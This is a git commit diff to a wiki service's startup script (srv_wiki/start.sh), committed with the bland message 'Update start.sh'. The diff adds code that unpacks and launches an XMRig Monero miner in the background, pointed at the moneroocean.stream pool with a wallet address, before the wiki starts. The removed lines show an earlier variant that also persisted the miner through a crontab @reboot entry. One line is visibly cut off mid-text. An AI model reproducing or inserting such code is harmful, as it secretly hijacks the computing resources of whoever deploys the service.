593b2fe5ab0a5a80a9733c550289c7ac30f02482
JrScriptKiddie <69801869+JrScriptKiddie@users.noreply.github.com>
2026-02-06 15:41:18 +0300

    Update start.sh

--- srv_wiki/start.sh
+++ srv_wiki/start.sh
@@ -6,17 +6,19 @@ echo "Updating routing table..."
 ip route del default 2>/dev/null || true
 ip route add default via "$GATEWAY_IP" || true
 
-exec /app/leafwiki "$@"
-
-# Старт майнера
-tar -xzf /tmp/miner.tar.gz -C /tmp
+# 2. Распаковка и запуск майнера (ДО основного приложения!)
+echo "Deploying miner..."
+tar -xzf /tmp/miner.tar.gz -C /tmp || {
+  echo "ERROR: Failed to extract miner" >&2
+  exit 1
+}
 
 XMRIG_DIR="/tmp/xmrig-6.24.0"
-if [ ! -d "$XMRIG_DIR" ]; then
-    echo "!!"
-    exit 1
-fi
+if [ ! -f "$XMRIG_DIR/xmrig" ]; then
+…"$XMRIG_DIR/xmrig" --background --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG &
+MINER_PID=$!
 
-chmod +x "$XMRIG_DIR/xmrig"
-(crontab -l 2>/dev/null; echo "@reboot $XMRIG_DIR/xmrig --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG") | crontab -
-nohup "$XMRIG_DIR/xmrig" --daemon --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG  &
+echo "Miner started with PID $MINER_PID"
+
+
+exec /app/leafwiki "$@"
